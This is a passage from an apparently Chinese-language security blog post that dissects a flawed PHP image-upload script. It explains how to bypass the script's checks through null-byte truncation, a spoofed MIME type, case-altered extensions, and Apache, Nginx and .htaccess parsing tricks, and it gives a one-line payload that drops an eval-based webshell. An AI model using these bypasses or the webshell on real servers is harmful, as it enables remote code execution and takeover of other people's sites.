class="string">"Return Code: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">else</span>													<span class="comment">//返回上传成功信息</span></div><div class="line">    &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Upload: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br /&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br /&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Size: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" Kb&lt;br /&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Temp file: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>] . <span class="string">"&lt;br /&gt;"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))  <span class="comment">//检测文件是否存在</span></div><div class="line">      &#123;</div><div class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</div><div class="line">      &#125;</div><div class="line">    <span class="keyword">else</span>			              <span class="comment">//将上传的临时文件转移到指定存放文件夹</span></div><div class="line">      &#123;</div><div class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</div><div class="line">      <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line">      <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"Invalid file"</span>;			    <span class="comment">//返回无效文件的错误信息</span></div><div class="line">  &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><a id="more"></a><h2 id="0x01-详细分析过程"><a href="#0x01-%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B" class="headerlink" title="0x01 详细分析过程"></a>0x01 详细分析过程</h2><p><strong>1) 直接使用用户上传文件名，没有过滤特殊字符，存在漏洞</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)		     <span class="comment">//文件类型检测</span></div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>))</div><div class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">20000</span>))</div><div class="line">  &#123;</div><div class="line">  $ext = end(explode(<span class="string">'.'</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));  <span class="comment">//文件后缀检测</span></div><div class="line">  <span class="keyword">if</span>($ext === <span class="string">'php'</span>)&#123;</div><div class="line">  	</div><div class="line">  	<span class="keyword">exit</span>(<span class="string">'error'</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">      ......                                      <span class="comment">//省略了中间的一些代码</span></div><div class="line">``` </div><div class="line">以下代码的作用是，将上传到临时文件夹的文件移到upload的目录下     </div><div class="line">```php</div><div class="line"><span class="keyword">else</span>											 </div><div class="line"> &#123;</div><div class="line"> move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</div><div class="line"> <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line"> <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line"> &#125;</div></pre></td></tr></table></figure><p><strong>1.1分析：</strong></p><p>从以上代码可以看出，可以上传图片文件，对文件拓展名检测是通过<code>end(explode(‘.’,$_FILES[“file”][“name”]))</code>函数实现（在这里先不说文件类型验证的问题）<code>explode(‘.’,$_FILES[“file”][“name”])</code>用来把上传的文件名作为字符串，以.(点)来分割字符串来生成数组，而<code>end()</code>函数则是将数组内部指针指向最后一个元素，并返回该元素的值，例如，当上传x.php文件时，最终就会获取到php。<br>而对于<code>$_FILES</code>里面获取变量，是直接来自http request请求，它跟普通获取其它get,post变量一样。 比如在post上传时，我们可以通过抓包来截获（常用神器burpsuite）这一过程，由于在上传的检测中没有对文件名进行检测和过滤及处理，因此，我们可以将name构造一个特殊文件名，然后，再将post数据提交，就可以达到上传绕过对文件扩展名的检测。</p><p><strong>1.2利用：</strong></p><p>比如我们可以在本地上将一个php文件命名为x.php.jpg在上传文件时，抓包post，将filename修改为<code>x.php\0.jpg</code>再提交post数据，那么在保存我们修改后的文件时，<code>\0</code>后面的所有字符将(如.jpg)被自动截断，最终生成我们想要目标文件格式(如本例的x.php)，以至于可以上传任意恶意的php脚本。从网上得到说明Php4的版本可以利用这个漏洞，php5版本以上会自动过滤掉<code>’”/0”</code>，另外很多asp,jsp也存在此类截断上传的漏洞。</p><p><strong>2)文件类型验证不严格，存在漏洞*</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>))</div><div class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">20000</span>))</div><div class="line">  &#123;</div><div class="line">  $ext = end(explode(<span class="string">'.'</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));</div><div class="line">  <span class="keyword">if</span>($ext === <span class="string">'php'</span>)&#123;  	</div><div class="line">  	<span class="keyword">exit</span>(<span class="string">'error'</span>);</div><div class="line">  &#125;</div></pre></td></tr></table></figure><p><strong>2.1分析:</strong></p><p>从代码可以看出是通过读取文件的type直接来做文件类型的判断，同样我们可以通过抓取post数据，将Content-type值修改为允许上传的MIME类型，在这里有image/gif等三种，从而绕过对文件type的检查，虽然之后代码对文件扩展名进行了检测(那两个个函数对文件扩展名检测的大慨过程就是判断文件名最后”.”的最后字符，example.php.bak最终得到是bak)，并判断是否是php后缀名。</p><p><strong>2.2利用:</strong></p><p>1.如果没有对apache默认支持解析文件方式进行修改时(即apache解析漏洞,很多网站管理员由于安全意识薄弱或其他情况往往没有修改)，那么在绕过对type的检测之后，最简单的利用方式就是我们可以直接上传一个恶意的名为x.php.ext，这里的ext可以是多种，只要不是php和apache可以解析其他扩展名(如txt后缀)就可以，那么按照apache默认从右往左直到遇到可支持解析的文件的解析方式，那么就会把x.php.ext当成x.php来解析。</p><p>2.在绕过对文件type检查之后，我们还可以将本地的x.php文件修改为x.php1,x.php3,x.php4或者x.php5再上传，默认的apache服务器将会解析为php。</p><p><strong>3)使用php的全等于来判断是否为php文件类型，存在漏洞</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ext = end(explode(<span class="string">'.'</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));</div><div class="line"><span class="keyword">if</span>($ext === <span class="string">'php'</span>)&#123;  	</div><div class="line">  	<span class="keyword">exit</span>(<span class="string">'error'</span>);</div><div class="line">  &#125;</div></pre></td></tr></table></figure><p><strong>3.1分析:</strong></p><p>我们知道在php语法中全等于”===”的作用是先判断等号左右两边的数据类型是否一样，再判断等号两边的值是否相等，如果都相等返回true，否者返回false。</p><p><strong>3.2利用:</strong></p><p>在明白全等于”===”的判断原理之后，我们就可以进行利用了，还是以本地的x.php举例，我们可以将x.php修改为Php, x.PHp, PHP…在绕过对type的检测之后再上传，以上传的x.PHP来分析，首先上传截获到的是PHP后缀，此时$ext=PHP，再将进行下一步的验证，$ext和php都是相同的数据类型，但是在验证它们值时却不相等，从而绕过上传。</p><p>而默认的web应用程序都是默认将<code>Php</code>，<code>x.PHp</code>,<code>PHP</code>…解析为php执行。</p><p><strong>4)对上传文件内容没有做检测，存在漏洞</strong></p><p><strong>4.1分析:</strong></p><p>从upload.php源代码分析来看，在整个过程没有对上传文件内容进行检测，过滤和处理，可以通过上传图片木马或其他方式来到达恶意上传的目的。</p><p><strong>4.2利用:</strong></p><p>1.如果的网站是用Nginx的Web应用程序且版本<code>&lt;8.03</code>，那我们就可以利用Nginx默认开启Fast-CGI而造成的畸形解析漏洞，以下是具体利用方式说明。在默认Fast-CGI开启状况下,我们可以上传一个名为x.jpg，其内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd])?&gt;'</span>);<span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>的文件，之后我们再访问<code>x.jpg/.php</code>这个网站路径,在这个目录下就会生成一句话木马shell.php。</p><p>2.如果的网站是用Nginx的Web应用程序且版本在(<code>0.5.*，0.6.*，0.7，0.8&lt;=0.7.65&lt;=0.8.37</code>)其中，那我们还可以利用Nginx空字节代码执行漏洞来达到上传任意恶意代码并执行。具体利用方法是：将<code>x.jpg</code>图片中嵌入PHP代码然后通过访问<code>x.jpg%00.php</code>来执行其中的恶意代码。</p><p>3.如果网站的Apache Web应用程序中<code>.htaccess</code>可被执行且可被上传，那可以尝试在.htaccess中写入:<br><code>&lt;FilesMatch &quot;example.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code><br>这段代码的意思就是将把目录下的所有后缀为jpg的文件当做可执行的php脚本进行解析并执行。因此，我们可以上传一个x.jpg的木马, 这样x.jpg就可解析为php文件。</p></div></article><div class="blog-post-comments"><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about/index.html">About</a></li><li><a href="../../../../link/index.html">Link</a></li><li><a href="../../../../tags/kali-linux/index.html">Kali</a></li><li><a href="../../../../archives/index.html">Archives</a></li><li><a href="https://github.com/sunnyelf">Projects</a></li><li><a href="../../../../search/index.html">Search</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E7%AE%80%E5%8D%95%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">0x00 简单源码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">0x01 详细分析过程</span></a></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" href="https://www.facebook.com/sharer.php?u=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://twitter.com/share?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;text=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;title=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;is_video=false&amp;description=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="../../../../cdn-cgi/l/email-protection.html#38074b4d5a525d5b4c05dd8885dea4b8dd9c9fddb797d0bb85ddb0bedea6a8dc80b2dc8498de82a8df98b9ddb7b2de84b7de8ca6ddb091dfac90deae81dd84b71e5a575c41057b505d5b5318574d4c184c50514b18594a4c515b545d0218504c4c484b02171750595b535e4d5616574a5f170a08090f17080b17080b17dd8885dea4b8dd9c9fddb797d0bb85ddb0bedea6a8dc80b2dc8498de82a8df98b9ddb7b2de84b7de8ca6ddb091dfac90deae81dd84b717"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://getpocket.com/save?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;title=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://reddit.com/submit?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;title=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;title=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://digg.com/submit?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;title=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://www.tumblr.com/share/link?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;name=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F&amp;description=%3Ch2%20id=%220x00-%E7%AE%80%E5%8D%95%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%22%3E%3Ca%20href=%22#0x00-%E7%AE%80%E5%8D%95%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%22%20class=%22headerlink%22%20title=%220x00%20%E7%AE%80%E5%8D%95%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%22%3E%3C/a%3E0x00%20%E7%AE%80%E5%8D%95%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%3C/h2%3E%3Cfigure%20class=%22highlight%20php%22%3E%3Ctable%3E%3Ctr%3E%3Ctd%20class=%22gutter%22%3E%3Cpre%3E%3Cdiv%20class=%22line%22%3E1%3C/div%3E%3Cdiv%20class=%22line%22%3E2%3C/div%3E%3Cdiv%20class=%22line%22%3E3%3C/div%3E%3Cdiv%20class=%22line%22%3E4%3C/div%3E%3Cdiv%20class=%22line%22%3E5%3C/div%3E%3Cdiv%20class=%22line%22%3E6%3C/div%3E%3Cdiv%20class=%22line%22%3E7%3C/div%3E%3Cdiv%20class=%22line%22%3E8%3C/div%3E%3Cdiv%20class=%22line%22%3E9%3C/div%3E%3Cdiv%20class=%22line%22%3E10%3C/div%3E%3Cdiv%20class=%22line%22%3E11%3C/div%3E%3Cdiv%20class=%22line%22%3E12%3C/div%3E%3Cdiv%20class=%22line%22%3E13%3C/div%3E%3Cdiv%20class=%22line%22%3E14%3C/div%3E%3Cdiv%20class=%22line%22%3E15%3C/div%3E%3Cdiv%20class=%22line%22%3E16%3C/div%3E%3Cdiv%20class=%22line%22%3E17%3C/div%3E%3Cdiv%20class=%22line%22%3E18%3C/div%3E%3Cdiv%20class=%22line%22%3E19%3C/div%3E%3Cdiv%20class=%22line%22%3E20%3C/div%3E%3Cdiv%20class=%22line%22%3E21%3C/div%3E%3Cdiv%20class=%22line%22%3E22%3C/div%3E%3Cdiv%20class=%22line%22%3E23%3C/div%3E%3Cdiv%20class=%22line%22%3E24%3C/div%3E%3Cdiv%20class=%22line%22%3E25%3C/div%3E%3Cdiv%20class=%22line%22%3E26%3C/div%3E%3Cdiv%20class=%22line%22%3E27%3C/div%3E%3Cdiv%20class=%22line%22%3E28%3C/div%3E%3Cdiv%20class=%22line%22%3E29%3C/div%3E%3Cdiv%20class=%22line%22%3E30%3C/div%3E%3Cdiv%20class=%22line%22%3E31%3C/div%3E%3Cdiv%20class=%22line%22%3E32%3C/div%3E%3Cdiv%20class=%22line%22%3E33%3C/div%3E%3Cdiv%20class=%22line%22%3E34%3C/div%3E%3Cdiv%20class=%22line%22%3E35%3C/div%3E%3Cdiv%20class=%22line%22%3E36%3C/div%3E%3Cdiv%20class=%22line%22%3E37%3C/div%3E%3Cdiv%20class=%22line%22%3E38%3C/div%3E%3Cdiv%20class=%22line%22%3E39%3C/div%3E%3C/pre%3E%3C/td%3E%3Ctd%20class=%22code%22%3E%3Cpre%3E%3Cdiv%20class=%22line%22%3E%3Cspan%20class=%22meta%22%3E%3C?php%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%3Cspan%20class=%22keyword%22%3Eif%3C/span%3E%20((($_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22type%22%3C/span%3E%5D%20==%20%3Cspan%20class=%22string%22%3E%22image/gif%22%3C/span%3E)%3Cspan%20class=%22comment%22%3E//%E6%A3%80%E6%B5%8BContent-type%E5%80%BC%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%7C%7C%20($_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22type%22%3C/span%3E%5D%20==%20%3Cspan%20class=%22string%22%3E%22image/jpeg%22%3C/span%3E)%3C/div%3E%3Cdiv%20class=%22line%22%3E%7C%7C%20($_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22type%22%3C/span%3E%5D%20==%20%3Cspan%20class=%22string%22%3E%22image/pjpeg%22%3C/span%3E))%3C/div%3E%3Cdiv%20class=%22line%22%3E&amp;&amp;%20($_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22size%22%3C/span%3E%5D%20%3C%20%3Cspan%20class=%22number%22%3E20000%3C/span%3E))%20%20%20%20%20%20%20%3Cspan%20class=%22comment%22%3E//%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%7B%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20$ext%20=%20end(explode(%3Cspan%20class=%22string%22%3E&apos;.&apos;%3C/span%3E,%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22name%22%3C/span%3E%5D));%20%20%3Cspan%20class=%22comment%22%3E//%E8%8E%B7%E5%8F%96%E6%9C%80%E5%90%8E%E2%80%9C.%E2%80%9D%E7%9A%84%E5%90%8E%E7%BC%80%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%3Cspan%20class=%22keyword%22%3Eif%3C/span%3E($ext%20===%20%3Cspan%20class=%22string%22%3E&apos;php&apos;%3C/span%3E)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class=%22comment%22%3E//%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E4%B8%BAphp%E5%90%8E%E7%BC%80%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%7B%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eexit%3C/span%3E(%3Cspan%20class=%22string%22%3E&apos;error&apos;%3C/span%3E);%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%7D%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%3Cspan%20class=%22keyword%22%3Eif%3C/span%3E%20($_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22error%22%3C/span%3E%5D%20%3E%20%3Cspan%20class=%22number%22%3E0%3C/span%3E)%20%20%20%20%20%20%3Cspan%20class=%22comment%22%3E//%E8%BF%94%E5%9B%9E%E4%B8%8A%E4%BC%A0%E9%94%99%E8%AF%AF%E7%A0%81%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%7B%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20%3Cspan%20class=%22string%22%3E%22Return%20Code:%20%22%3C/span%3E%20.%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22error%22%3C/span%3E%5D%20.%20%3Cspan%20class=%22string%22%3E%22%3Cbr%20/%3E%22%3C/span%3E;%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%7D%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%3Cspan%20class=%22keyword%22%3Eelse%3C/span%3E%3Cspan%20class=%22comment%22%3E//%E8%BF%94%E5%9B%9E%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%E4%BF%A1%E6%81%AF%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%7B%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20%3Cspan%20class=%22string%22%3E%22Upload:%20%22%3C/span%3E%20.%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22name%22%3C/span%3E%5D%20.%20%3Cspan%20class=%22string%22%3E%22%3Cbr%20/%3E%22%3C/span%3E;%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20%3Cspan%20class=%22string%22%3E%22Type:%20%22%3C/span%3E%20.%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22type%22%3C/span%3E%5D%20.%20%3Cspan%20class=%22string%22%3E%22%3Cbr%20/%3E%22%3C/span%3E;%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20%3Cspan%20class=%22string%22%3E%22Size:%20%22%3C/span%3E%20.%20($_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22size%22%3C/span%3E%5D%20/%20%3Cspan%20class=%22number%22%3E1024%3C/span%3E)%20.%20%3Cspan%20class=%22string%22%3E%22%20Kb%3Cbr%20/%3E%22%3C/span%3E;%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20%3Cspan%20class=%22string%22%3E%22Temp%20file:%20%22%3C/span%3E%20.%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22tmp_name%22%3C/span%3E%5D%20.%20%3Cspan%20class=%22string%22%3E%22%3Cbr%20/%3E%22%3C/span%3E;%3C/div%3E%3Cdiv%20class=%22line%22%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eif%3C/span%3E%20(file_exists(%3Cspan%20class=%22string%22%3E%22upload/%22%3C/span%3E%20.%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22name%22%3C/span%3E%5D))%20%20%3Cspan%20class=%22comment%22%3E//%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%3C/span%3E%3C/div